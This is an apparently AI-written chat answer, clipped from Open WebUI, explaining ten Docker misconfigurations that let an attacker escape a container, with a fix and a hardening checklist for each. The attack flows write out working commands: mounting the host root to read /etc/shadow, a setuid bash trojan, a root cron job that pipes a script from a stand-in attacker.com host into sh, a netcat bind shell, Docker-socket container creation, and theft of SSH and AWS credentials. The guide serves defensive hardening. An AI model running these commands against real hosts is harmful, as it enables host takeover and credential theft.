---
title: "Docker Escape CVEs 🔓 • Open WebUI"
source: "https://ai.headmind.com/c/e9d66919-b40e-4145-8e7d-f3900ec6dcdb"
author:
published:
created: 2026-06-22
description: "Open WebUI"
tags:
  - "clippings"
---
## 1️⃣  Running the container privileged (--privileged or securityContext.privileged: true)

### What it looks like

```bash
docker run -d --name webapp --privileged mycompany/webapp:1.2
# or in k8s
securityContext:
  privileged: true
```

### Why it matters

- Grants **all Linux capabilities** to the container.
- Disables most Seccomp/AppArmor/SELinux restrictions.
- Allows the container to mount filesystems, change namespaces, load kernel modules, etc.

### Attack flow (from RCE inside the web app)

```bash
# 1️⃣ The attacker gets a shell inside the container (e.g., via a PHP eval())
/bin/sh

# 2️⃣ Because the container is privileged they can mount the host root
mount -t overlay overlay -o lowerdir=/,upperdir=/tmp/upper,workdir=/tmp/work /tmp/merged

# 3️⃣ The host’s \`/etc/shadow\` now appears at /tmp/merged/etc/shadow
cat /tmp/merged/etc/shadow   # read host password hashes

# 4️⃣ Or they can replace the host’s /bin/bash with a back‑door
cp /bin/bash /tmp/merged/bin/bash.original
cp /tmp/my_backdoor /tmp/merged/bin/bash
chmod +s /tmp/merged/bin/bash   # setuid root → every host user now runs the back‑door
```

### Fix

- **Never use `--privileged`** unless you truly need device access (e.g., a storage driver).
- Use **fine‑grained capabilities** (`--cap-add` / `securityContext.capabilities`) and keep the default set.

---

## 2️⃣  Mounting the host Docker socket (/var/run/docker.sock) into the container

### What it looks like

```bash
docker run -d -v /var/run/docker.sock:/var/run/docker.sock mycompany/webapp
# k8s
volumeMounts:
  - name: dockersock
    mountPath: /var/run/docker.sock
volumes:
  - name: dockersock
    hostPath:
      path: /var/run/docker.sock
```

### Why it matters

- The socket is the **remote‑API endpoint** to the Docker daemon.
- Any process that can talk to it can **create/stop containers**, **mount the host filesystem**, or **replace the daemon binary** – effectively giving the attacker **root on the host**.

### Attack flow

```bash
# 1️⃣ Inside the compromised container:
curl -X POST -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh"],"HostConfig":{"Privileged":true}}' \
  --unix-socket /var/run/docker.sock \
  http://localhost/v1.41/containers/create

# 2️⃣ Docker returns a new container ID, e.g. "abc123"
curl -X POST --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/abc123/start

# 3️⃣ The newly created container is privileged and runs \`sh\` – the attacker now has a **second shell that is not confined** by the original container’s namespaces.
docker exec -it abc123 sh
# At this point they can mount the host, read /etc/shadow, etc.
```

### Fix

- **Never bind‑mount the Docker socket** into a workload.
- If you really need to build images, use a **socket‑proxy** (e.g., `docker-socket-proxy` or `socat` with ACLs) that only allows the needed API calls.
- Consider **BuildKit**, **Kaniko**, or **image‑builder** services that run outside the host daemon.

---

## 3️⃣  Giving the container SYS\_ADMIN capability (or any other high‑impact capability)

### What it looks like

```bash
docker run -d --cap-add=SYS_ADMIN mycompany/webapp
# k8s
securityContext:
  capabilities:
    add: ["SYS_ADMIN"]
```

### Why it matters

- `SYS_ADMIN` is essentially the **“super‑user”** capability in the kernel.
- It enables **mount**, **pivot\_root**, **unshare**, **setns**, **mknod**, and many other privileged syscalls that can be abused to break out of namespaces.

### Attack flow (using the same RCE shell)

```bash
# 1️⃣ Mount the host root (requires only SYS_ADMIN)
mount -t overlay overlay -o lowerdir=/,upperdir=/tmp/upper,workdir=/tmp/work /tmp/merged

# 2️⃣ Read host files
cat /tmp/merged/etc/passwd

# 3️⃣ Write a cron job that runs as root on the host
mkdir -p /tmp/merged/etc/cron.d
echo "* * * * * root curl -fsSL http://attacker.com/payload.sh | sh" \
  > /tmp/merged/etc/cron.d/evil

# 4️⃣ The host’s cron daemon will execute the payload as root within a minute.
```

### Fix

- **Drop all capabilities by default** (`--cap-drop=ALL`).
- Add only the **exact** capabilities the container truly needs (e.g., `CAP_NET_BIND_SERVICE` to bind to low ports).

---

## 4️⃣  Mounting the host filesystem (or large portions of it) into the container

### What it looks like

```bash
docker run -d -v /:/host -v /var/run/docker.sock:/var/run/docker.sock mycompany/webapp
# k8s
volumeMounts:
  - name: hostfs
    mountPath: /host
volumes:
  - name: hostfs
    hostPath:
      path: /
```

### Why it matters

- Gives the container **direct read/write** access to *any* host file.
- When combined with `SYS_ADMIN` or `--privileged`, the attacker can **modify binaries, inject back‑doors, or replace system files**.

### Attack flow

```bash
# 1️⃣ Inside the compromised container:
# (Assume the mount is read‑write; if it’s read‑only the attacker still can read secrets)
cat /host/etc/shadow               # steal password hashes
cp /bin/bash /host/tmp/bash.back   # backup host bash
cp /tmp/malicious /host/bin/bash   # replace host /bin/bash with a trojan
chmod +s /host/bin/bash            # setuid root → every host user runs the trojan
```

### Fix

- **Never mount `/`** (or any high‑value directory) into a workload.
- If you need a specific host file, mount **only that file** (`-v /etc/ssl/certs/ca-certificates.crt:/etc/ssl/certs/ca-certificates.crt:ro`).
- Use **read‑only** mounts (`ro`) whenever possible.

---

## 5️⃣  Running the container as UID 0 (root) inside the container without any additional hardening

### What it looks like

```dockerfile
FROM node:18
# No USER instruction → defaults to root
COPY . /app
CMD ["node", "server.js"]
```

### Why it matters

- Even without `--privileged`, a **root process** inside the container can exploit kernel bugs (e.g., CVE‑2019‑5736) or take advantage of any other mis‑configuration.
- If the attacker gains any extra capability (via the other bad practices above) they instantly have **host‑root**.

### Attack flow (combined with a minor mis‑configuration)

```bash
# 1️⃣ The attacker already has a shell as root inside the container (RCE).
# 2️⃣ They discover the container is running a vulnerable runc (≤ 1.0.0‑rc6).
# 3️⃣ Exploit CVE‑2019‑5736 by overwriting the host runc binary:
cat <<'EOF' > /tmp/evil.c
#include <stdio.h>
int main(){system("/bin/bash");}
EOF
gcc /tmp/evil.c -o /tmp/evil
chmod +x /tmp/evil
# Overwrite the host's runc (through /proc/self/exe)
cp /tmp/evil /proc/self/exe
# The next container launch will execute /tmp/evil as root on the host → full shell
```

> **Note:** The above snippet is a *conceptual* illustration of the overwrite technique; the actual exploit requires a race condition that is well documented in the original CVE advisory.

### Fix

- **Create and use a non‑root user** inside the image (`RUN groupadd -r app && useradd -r -g app app && USER app`).
- Enable **user‑namespace remapping** on the Docker daemon (`--userns-remap`).

---

## 6️⃣  Disabling Seccomp / AppArmor / SELinux profiles

### What it looks like

```bash
docker run -d --security-opt seccomp=unconfined mycompany/webapp
# k8s
securityContext:
  seccompProfile:
    type: Unconfined
```

### Why it matters

- These LSMs (Linux Security Modules) block dangerous syscalls such as `mount`, `pivot_root`, `unshare`, `ptrace`, etc.
- Turning them off removes the **last line of defence** against many container‑escape techniques.

### Attack flow (with only SYS\_ADMIN added)

```bash
# With seccomp disabled, the attacker can freely call privileged syscalls:
mount -t overlay overlay -o lowerdir=/,upperdir=/tmp/upper,workdir=/tmp/work /tmp/merged
# … proceed as in the “SYS_ADMIN” example to read host files.
```

### Fix

- **Never run with `unconfined`** unless you have a proven, audited reason.
- Keep Docker’s default seccomp profile, or supply a **custom profile that explicitly denies** the syscalls you don’t need.

---

## 7️⃣  Running Docker‑in‑Docker (DinD) with --privileged or with the host socket

### What it looks like

```bash
docker run -d --privileged -v /var/run/docker.sock:/var/run/docker.sock \
    docker:dind
# or in CI pipelines: image=docker:20.10-dind
```

### Why it matters

- The inner Docker daemon can **control the outer daemon** (because they share the same socket).
- If the inner daemon is compromised, the attacker can spin up **new privileged containers** on the host.

### Attack flow

```bash
# From the compromised web‑app container, the attacker contacts the inner Docker daemon:
docker -H unix:///var/run/docker.sock ps   # list containers on the host
docker -H unix:///var/run/docker.sock run -d --privileged alpine sh -c "while true; do sleep 3600; done"
# Now they have a brand‑new privileged container under their full control.
```

### Fix

- **Avoid DinD** for CI builds. Use **Kaniko**, **BuildKit**, **GitHub Actions’ `docker/build-push-action`**, or **remote build services**.
- If you really need DinD, run it **without `--privileged`** and **do not mount the host Docker socket**; instead use a **private socket** inside the DinD container.

---

## 8️⃣  Exposing the host network namespace (--network host)

### What it looks like

```bash
docker run -d --network host mycompany/webapp
# k8s
hostNetwork: true
```

### Why it matters

- The container shares the host’s network stack, giving it visibility into all host traffic and the ability to bind privileged ports (e.g., 22, 80).
- Combined with `SYS_ADMIN` or `--privileged`, an attacker can sniff traffic, hijack sessions, or inject malicious packets that reach the host.

### Attack flow

```bash
# Inside the compromised container:
tcpdump -i any -w /tmp/capture.pcap   # capture host traffic, including SSH credentials
# Or open a reverse shell that listens on a privileged port:
nc -l -p 22 -e /bin/bash   # if no SSH daemon is running, this will become the host's SSH service
```

### Fix

- **Never use `--network host`** unless the workload truly requires direct access to the host’s network (e.g., a network‑monitoring daemon).
- Use bridge or overlay networks and enforce **NetworkPolicies** (K8s) or Docker’s built‑in firewall rules.

---

## 9️⃣  Mounting /proc or /sys from the host (-v /proc:/hostproc, -v /sys:/hostsys)

### What it looks like

```bash
docker run -d -v /proc:/hostproc -v /sys:/hostsys mycompany/webapp
```

### Why it matters

- Gives the container a view (and potentially write‑access) to **kernel‑level information**.
- An attacker can discover host PID numbers, read kernel parameters, or (with `SYS_ADMIN`) write to `/hostproc/sys/kernel/*` to disable security modules.

### Attack flow

```bash
# Discover the host PID of the Docker daemon:
ps -ef | grep dockerd | awk '{print $2}'   # reads from /hostproc
# Then, using ptrace (needs SYS_ADMIN) inject code into the daemon to spawn a root shell.
```

### Fix

- **Do not mount `/proc` or `/sys`** unless you have a very specific, audited need.
- If you need limited kernel information, use **read‑only, filtered mounts** (e.g., `-v /proc/sys/net/ipv4/ip_forward:/hostproc/ip_forward:ro`).

---

## 🔟  Storing secrets inside the image or on a host bind‑mount

### What it looks like

```dockerfile
# BAD: copying a private key into the image
COPY id_rsa /root/.ssh/id_rsa
# BAD: mounting a host directory that contains AWS credentials
-v /home/ci/.aws:/root/.aws
```

### Why it matters

- Even if the container is perfectly sandboxed, **once the attacker escapes** they instantly have the secret and can pivot to other systems (cloud APIs, internal services, etc.).
- If the image is pushed to a public registry, the secret leaks to everyone.

### Attack flow (after any of the previous escapes)

```bash
# Read the secret file that was baked into the image:
cat /root/.ssh/id_rsa
# Or from the host‑mounted directory:
cat /root/.aws/credentials
# Use the key to SSH into other servers or call AWS APIs as a privileged IAM role.
```

### Fix

- **Never bake secrets into images**. Use **Docker secrets**, **Kubernetes Secrets**, or a dedicated secrets manager (Vault, AWS Secrets Manager, GCP Secret Manager).
- Mount secrets **read‑only** and **only for the lifetime of the container**.

---

## 📋 Summary Checklist – “If any of these are true, you have a high‑risk path to host escape once an attacker gets a shell inside the container”

| ❌ Bad practice | ✅ Secure alternative |
| --- | --- |
| `--privileged` or `securityContext.privileged:true` | Remove; add only needed capabilities. |
| Mounting `/var/run/docker.sock` | Use a socket‑proxy with ACLs, or avoid Docker‑in‑Docker. |
| Adding `SYS_ADMIN` (or other high‑impact caps) | Drop all caps, add only the minimum (`CAP_NET_BIND_SERVICE`, etc.). |
| Mounting `/` (or large host directories) into the container | Mount **only** the exact files needed, and `:ro` whenever possible. |
| Running as UID 0 inside the container | Create and use a non‑root user; enable user‑namespace remapping. |
| `--security-opt seccomp=unconfined` (or AppArmor/SELinux disabled) | Keep default profiles; tailor custom profiles to *deny* dangerous syscalls. |
| Docker‑in‑Docker with `--privileged` / host socket | Use Kaniko, BuildKit, or remote builder services; if DinD is required, run it unprivileged with a private socket. |
| `--network host` | Use bridge/overlay networks; enforce NetworkPolicies. |
| Host `/proc` or `/sys` mounts | Do not mount; if needed, expose only read‑only, filtered files. |
| Secrets baked into images or host‑mounted directories | Use orchestrator secrets, external vaults, or runtime injection only. |

---

## 🚀 How to test your own environment (legal, internal only)

| Test | Command | Expected result (safe) |
| --- | --- | --- |
| **Privileged‑escape simulation** | `docker run --rm -it --privileged alpine sh -c "mount -t overlay overlay -o lowerdir=/,upperdir=/tmp/upper,workdir=/tmp/work /tmp/merged && ls /tmp/merged"` | Should **fail** on a properly hardened host (Docker will block the mount because the kernel’s overlay driver refuses the operation when `overlay2` is in use with user‑namespaces). |
| **Docker‑socket exposure** | `docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh -c "apk add curl && curl -s --unix-socket /var/run/docker.sock http://localhost/_ping"` | Should return `OK`; the test shows the socket is reachable— **remediate** if you never needed it. |
| **Seccomp profile check** | \`docker run --rm -it --security-opt seccomp=unconfined alpine cat /proc/self/status | grep CapEff\` |
| **User‑namespace verification** | \`docker info | grep -i userns\` |
| **Read‑only mount test** | `docker run --rm -it -v /etc:/host-etc:ro alpine ls /host-etc` | Should list files, but any write attempt (`touch /host-etc/test`) must fail. |

Run these checks **inside a staging environment** before you push any change to production.

---

### TL;DR

1. **RCE → host escape** is possible **whenever the container has any of the following**: `--privileged`, host‑Docker‑socket bind‑mount, `SYS_ADMIN` /high capabilities, host filesystem mounts, root UID, disabled LSM profiles, DinD with host socket, host network/proc/sys mounts, or secrets baked into the image.
2. **Each mis‑configuration alone** can be the single step that lets an attacker move from “just a shell inside the container” to “root on the host”.
3. **Remedy** by **default‑denying** those privileges, **using non‑root users**, **enabling Seccomp/AppArmor/SELinux**, **avoiding host‑socket or host‑fs mounts**, and **storing secrets outside the image**.

Apply the checklist to every Dockerfile, Helm chart, CI pipeline, and production host. Once all the red flags are removed, an RCE inside a container will stay **confined** to that container, and the host remains safe.

Questions de suivi

---

Open WebUI